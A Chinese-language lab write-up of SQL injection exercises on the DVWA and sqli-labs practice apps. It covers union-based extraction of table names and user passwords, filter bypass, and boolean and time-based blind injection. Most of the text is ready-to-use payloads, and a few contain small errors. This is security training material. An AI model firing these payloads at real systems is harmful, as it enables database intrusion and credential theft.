一.DVWA的注入过程

1.打开DVWA

链接：http://10.21.13.97/

进入DVWA，登陆

username:admin

password:password

将DVWA Security设置为low，即有漏洞的版本。

2.进入SQL Injection,开始注入

（1）判断是数字型还是字符型

输入1发现没有报错，说明可以注入

输入1'and'1'='1 ,没有报错

输入1'and'1'='1 ，报错

输入1'or'1'='1,输出多条结果，说明是字符型

（2）猜解当前表中字段数

输入1' or '1'='1' order by 1 # ,输出多条结果

输入1' or '1'='1' order by 2 #，输出多条结果

输入1' or '1'='1' order by 3 #，报错，说明只有2个字段

（3）确定当前表中字段顺序

输入1' union select 1,2 #,输出多个结果，根据查询结果确定字段顺序

（4）获取当前数据库信息

输入1' union select 1,database()#,可以得到数据库dvwa

注：union select语句前后需要保证字段个数一致，否则会报错

（5）获得数据库中的表

输入1’ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#，可知存在guest,users两张表

（6）从users表中获取字段名

输入1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #,得到字段 user_id,first_name,last_name,user,password,avatar

注:字符型字段记得加引号，不然报错内。。。。

（7）获取信息

输入1' union select group_concat(user_id,first_name,last_name,user,avatar),group_concat(password) from users#,得到相关信息

二.绕过简单SQL注入之less-25

进入链接http://localhost/sqli-labs-master/less-25/

发现所有and和or都被绕过，

1.用&代替and,用|代替or,其中因为&为特殊转义字符，在URL中用%26替代，绕过成功

URL中特殊字符相关资料参考链接https://www.cnblogs.com/cdxkyz/p/3976167.html

2.开始注入，

输入1'|'1'='1' union select 1--+,报错

输入1'|'1'='1' union select 1,2--+，报错

输入1'|'1'='1' union select 1,2,3--+,查询成功,说明有三个字段

输入-1' union select 1,2,3--+,查询成功

可根据结果判断字段顺序，输入-1' union select 1,2,database()--+可以得到数据库名为security

继续输入-1' union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where table_schema='security'limit 0,1--+,可以得到表名

注：其中发现因为or会被过滤，所以要用infoorrmation替代information，下同

继续查询，进入表users,输入-1' union select 1,2,group_concat(column_name from infoorrmation_schema.tables where table_name='users' )--+,在表users中查询字段名得到结果id,username,password,id,username,password,sex,age,point,Id,username,password

可以得到最终信息，password的可能有：Your Password:Dumb,I-kill-you,p@ssword,crappy,stupidity,genious,mob!le,admin,admin1,admin2,admin3,dumbo,admin4

三.布尔型盲注之less-5

1.猜解当前数据库的名称

输入1' and ascii(mid(database(),1,1))>115--+'

逐步手动猜解得到ASCII码：115 101 99 117 114 105 116 121

得到库名：security

2.猜解数据库的表名

输入1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=114--+

手动猜解得到表emails,referers,uagents,users

3.猜解表users中的字段名

输入1' and ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1))=105--+，判断password在表users中

4.猜解列名对应的内容

输入1' and ascii(substr((select username from security.users order by id limit 0,1),1,1))=68--+

五.时间型盲注之less-9

1.判断是否有盲注点

注：sql语句执行成功和失败的返回的页面不存在差异，需要通过以下语句判断是否存在时间型盲注点。

输入1' and if ('1'= '1',1, sleep(5)) --+

没有延迟，返回为true，说明存在时间型盲注点

2.猜解当前数据库的名字

输入1' and if(ascii(substring(database(),1,1)) =115,1,sleep(5))--+，得到数据库名security

3.猜解数据库的表名

输入1' and if(ascii(substring((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))=114,1,sleep(5))--+,若延时表示false,手动猜解该数据库中有表users

4.猜解表中的列名

输入1' and if(ascii(substring((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1))=105, 1,sleep(5))--+,手动猜解发现存在字段password

5.猜解列名对应的内容

输入1' and if(ascii(substr((select username from security.users order by id limit 0,1),1,1))=68,1,sleep(5))--+,手动猜解所需信息
